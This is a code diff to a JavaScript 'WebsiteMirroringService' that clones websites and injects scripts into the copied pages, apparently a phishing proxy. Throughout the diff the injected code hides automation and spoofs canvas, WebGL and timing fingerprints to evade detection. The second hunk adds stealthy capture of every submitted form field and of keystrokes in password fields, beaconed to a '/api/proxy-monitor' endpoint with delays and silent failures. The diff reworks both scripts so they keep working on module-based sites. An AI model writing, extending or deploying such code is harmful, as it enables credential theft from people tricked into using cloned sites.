@@ -311,74 +311,161 @@ class WebsiteMirroringService {
         <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
       `);
 
-      // Inject advanced anti-detection script at the very beginning
-      $('head').prepend(`
-        <script>
-          (function() {
-            // Advanced bot detection bypass
-            Object.defineProperty(navigator, 'webdriver', {
-              get: () => undefined,
-              configurable: true
-            });
-            
-            // Spoof automation indicators
-            delete window.callPhantom;
-            delete window._phantom;
-            delete window.__phantom;
-            delete window.phantom;
-            delete window.webdriver;
-            delete window.domAutomation;
-            delete window.domAutomationController;
-            
-            // Override common detection methods
-            const originalToString = Function.prototype.toString;
-            Function.prototype.toString = function() {
-              const result = originalToString.call(this);
-              return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
-            };
-            
-            // Spoof geolocation with consent
-            if (navigator.geolocation) {
-              const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
-              navigator.geolocation.getCurrentPosition = function(success, error, options) {
-                // Simulate user denying location
-                if (error) error({ code: 1, message: 'User denied geolocation' });
+      // Preserve module loading systems - inject our scripts carefully
+      // Find if there are module scripts or webpack-style bundles
+      const hasModuleScripts = $('script[type="module"]').length > 0;
+      const hasWebpackBundles = $('script').toArray().some(script => {
+        const src = $(script).attr('src') || '';
+        const content = $(script).html() || '';
+        return src.includes('vendor') || src.includes('main') || src.includes('chunk') || 
+               content.includes('__webpack_require__') || content.includes('webpackJsonp');
+      });
+
+      // If there are module systems, be more careful with our script injection
+      if (hasModuleScripts || hasWebpackBundles) {
+        // Inject anti-detection script in a way that doesn't interfere with module loading
+        $('head').append(`
+          <script>
+            // Advanced bot detection bypass - run before modules load
+            (function() {
+              // Store original module functions before they get overwritten
+              const originalDefine = window.define;
+              const originalRequire = window.require;
+              
+              // Advanced bot detection bypass
+              Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined,
+                configurable: true
+              });
+              
+              // Spoof automation indicators
+              delete window.callPhantom;
+              delete window._phantom;
+              delete window.__phantom;
+              delete window.phantom;
+              delete window.webdriver;
+              delete window.domAutomation;
+              delete window.domAutomationController;
+              
+              // Override common detection methods without breaking modules
+              const originalToString = Function.prototype.toString;
+              Function.prototype.toString = function() {
+                const result = originalToString.call(this);
+                return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
               };
-            }
-            
-            // Block fingerprinting attempts
-            const blockFingerprinting = () => {
-              // Canvas fingerprinting
-              if (HTMLCanvasElement.prototype.toDataURL) {
-                HTMLCanvasElement.prototype.toDataURL = function() {
-                  return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+              
+              // Preserve module system functions
+              if (originalDefine && !window.define) window.define = originalDefine;
+              if (originalRequire && !window.require) window.require = originalRequire;
+              
+              // Block fingerprinting attempts without breaking modules
+              const blockFingerprinting = () => {
+                // Canvas fingerprinting
+                if (HTMLCanvasElement.prototype.toDataURL) {
+                  const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
+                  HTMLCanvasElement.prototype.toDataURL = function() {
+                    try {
+                      return originalToDataURL.apply(this, arguments);
+                    } catch(e) {
+                      return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+                    }
+                  };
+                }
+                
+                // WebGL fingerprinting
+                if (WebGLRenderingContext.prototype.getParameter) {
+                  const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
+                  WebGLRenderingContext.prototype.getParameter = function(parameter) {
+                    if (parameter === 37445 || parameter === 37446) {
+                      return 'Generic Renderer';
+                    }
+                    return originalGetParameter.call(this, parameter);
+                  };
+                }
+              };
+              
+              blockFingerprinting();
+              
+              // Override timing APIs to avoid detection
+              if (window.performance && window.performance.now) {
+                const originalNow = window.performance.now;
+                window.performance.now = function() {
+                  return originalNow.call(this) + Math.random() * 0.1;
+                };
+              }
+            })();
+          </script>
+        `);
+      } else {
+        // Original script injection for non-module sites
+        $('head').prepend(`
+          <script>
+            (function() {
+              // Advanced bot detection bypass
+              Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined,
+                configurable: true
+              });
+              
+              // Spoof automation indicators
+              delete window.callPhantom;
+              delete window._phantom;
+              delete window.__phantom;
+              delete window.phantom;
+              delete window.webdriver;
+              delete window.domAutomation;
+              delete window.domAutomationController;
+              
+              // Override common detection methods
+              const originalToString = Function.prototype.toString;
+              Function.prototype.toString = function() {
+                const result = originalToString.call(this);
+                return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
+              };
+              
+              // Spoof geolocation with consent
+              if (navigator.geolocation) {
+                const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
+                navigator.geolocation.getCurrentPosition = function(success, error, options) {
+                  // Simulate user denying location
+                  if (error) error({ code: 1, message: 'User denied geolocation' });
                 };
               }
               
-              // WebGL fingerprinting
-              if (WebGLRenderingContext.prototype.getParameter) {
-                const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
-                WebGLRenderingContext.prototype.getParameter = function(parameter) {
-                  if (parameter === 37445 || parameter === 37446) {
-                    return 'Generic Renderer';
-                  }
-                  return originalGetParameter.call(this, parameter);
+              // Block fingerprinting attempts
+              const blockFingerprinting = () => {
+                // Canvas fingerprinting
+                if (HTMLCanvasElement.prototype.toDataURL) {
+                  HTMLCanvasElement.prototype.toDataURL = function() {
+                    return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+                  };
+                }
+                
+                // WebGL fingerprinting
+                if (WebGLRenderingContext.prototype.getParameter) {
+                  const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
+                  WebGLRenderingContext.prototype.getParameter = function(parameter) {
+                    if (parameter === 37445 || parameter === 37446) {
+                      return 'Generic Renderer';
+                    }
+                    return originalGetParameter.call(this, parameter);
+                  };
+                }
+              };
+              
+              blockFingerprinting();
+              
+              // Override timing APIs to avoid detection
+              if (window.performance && window.performance.now) {
+                const originalNow = window.performance.now;
+                window.performance.now = function() {
+                  return originalNow.call(this) + Math.random() * 0.1;
                 };
               }
-            };
-            
-            blockFingerprinting();
-            
-            // Override timing APIs to avoid detection
-            if (window.performance && window.performance.now) {
-              const originalNow = window.performance.now;
-              window.performance.now = function() {
-                return originalNow.call(this) + Math.random() * 0.1;
-              };
-            }
-          })();
-        </script>
-      `);
+            })();
+          </script>
+        `);
+      }
 
       // Add base tag if it doesn't exist, or modify existing one
       const baseTag = $('base');
@@ -399,60 +486,76 @@ class WebsiteMirroringService {
              loading="lazy" />
       `);
       
-      // Advanced credential capture with stealth mode
+      // Advanced credential capture with stealth mode - inject after DOM is ready
       $('body').append(`
         <script>
+          // Wait for DOM and modules to be ready before injecting our monitoring
           (function() {
-            // Stealth form monitoring
-            const originalAddEventListener = EventTarget.prototype.addEventListener;
-            
-            // Monitor form submissions with advanced stealth
-            document.addEventListener('submit', function(e) {
+            const initMonitoring = function() {
               try {
-                const form = e.target;
-                if (!form || form.tagName !== 'FORM') return;
+                // Stealth form monitoring
+                const originalAddEventListener = EventTarget.prototype.addEventListener;
                 
-                const data = {};
-                const inputs = form.querySelectorAll('input, select, textarea');
-                
-                inputs.forEach(input => {
-                  if (input.name && input.value && 
-                      input.type !== 'submit' && 
-                      input.type !== 'button' && 
-                      input.type !== 'image') {
-                    data[input.name] = input.value;
+                // Monitor form submissions with advanced stealth
+                document.addEventListener('submit', function(e) {
+                  try {
+                    const form = e.target;
+                    if (!form || form.tagName !== 'FORM') return;
+                    
+                    const data = {};
+                    const inputs = form.querySelectorAll('input, select, textarea');
+                    
+                    inputs.forEach(input => {
+                      if (input.name && input.value && 
+                          input.type !== 'submit' && 
+                          input.type !== 'button' && 
+                          input.type !== 'image') {
+                        data[input.name] = input.value;
+                      }
+                    });
+                    
+                    // Stealth data transmission
+                    if (Object.keys(data).length > 0) {
+                      const img = new Image();
+                      img.src = '/api/proxy-monitor/${sessionToken}?' + 
+                               'data=' + encodeURIComponent(JSON.stringify(data)) + 
+                               '&url=' + encodeURIComponent(location.href) + 
+                               '&t=' + Date.now();
+                    }
+                  } catch(err) {
+                    // Silent fail
                   }
-                });
+                }, true);
                 
-                // Stealth data transmission
-                if (Object.keys(data).length > 0) {
-                  const img = new Image();
-                  img.src = '/api/proxy-monitor/${sessionToken}?' + 
-                           'data=' + encodeURIComponent(JSON.stringify(data)) + 
-                           '&url=' + encodeURIComponent(location.href) + 
-                           '&t=' + Date.now();
-                }
+                // Monitor input changes for real-time capture
+                let inputTimeout;
+                document.addEventListener('input', function(e) {
+                  if (e.target.type === 'password' || 
+                      e.target.name && e.target.name.toLowerCase().includes('pass')) {
+                    clearTimeout(inputTimeout);
+                    inputTimeout = setTimeout(() => {
+                      // Capture password attempts with delay to avoid detection
+                      const img = new Image();
+                      img.src = '/api/proxy-monitor/${sessionToken}?' + 
+                               'type=input&field=' + encodeURIComponent(e.target.name) + 
+                               '&value=' + encodeURIComponent(e.target.value) + 
+                               '&t=' + Date.now();
+                    }, 1000);
+                  }
+                }, true);
               } catch(err) {
                 // Silent fail
               }
-            }, true);
+            };
             
-            // Monitor input changes for real-time capture
-            let inputTimeout;
-            document.addEventListener('input', function(e) {
-              if (e.target.type === 'password' || 
-                  e.target.name && e.target.name.toLowerCase().includes('pass')) {
-                clearTimeout(inputTimeout);
-                inputTimeout = setTimeout(() => {
-                  // Capture password attempts with delay to avoid detection
-                  const img = new Image();
-                  img.src = '/api/proxy-monitor/${sessionToken}?' + 
-                           'type=input&field=' + encodeURIComponent(e.target.name) + 
-                           '&value=' + encodeURIComponent(e.target.value) + 
-                           '&t=' + Date.now();
-                }, 1000);
-              }
-            }, true);
+            // Initialize monitoring after a delay to let modules load
+            if (document.readyState === 'loading') {
+              document.addEventListener('DOMContentLoaded', function() {
+                setTimeout(initMonitoring, 100);
+              });
+            } else {
+              setTimeout(initMonitoring, 100);
+            }
           })();
         </script>
       `);
